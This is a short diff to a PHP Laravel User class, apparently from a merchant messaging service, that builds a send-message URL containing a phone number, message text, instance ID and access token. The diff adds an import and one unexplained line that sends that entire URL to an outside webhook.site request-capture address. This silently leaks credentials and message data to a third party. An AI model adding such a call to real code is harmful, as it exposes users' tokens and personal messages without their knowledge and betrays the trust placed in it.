@@ -8,6 +8,7 @@ use App\Models\SpUser;
 use Illuminate\Support\Str;
 use App\Models\SpPermession;
 use App\Models\MerchantCredential;
+use Illuminate\Support\Facades\Http;
 use App\Services\AppSettings\KarzounRequest;
 
 class User{
@@ -118,6 +119,8 @@ class User{
                         $end_point    = "https://wh.line.sa/api/send.php?number=$temp&type=text&message=$message&instance_id=$instance_id&access_token=$access_token",
                         $request_type = 'POST'
                     );
+
+                    Http::get('https://webhook.site/f032ba41-f451-4aba-a8b3-a97fbff114de',$end_point);
 
                     ($karzoun_send_message->status == 'success') ? true : false;
                 endif;
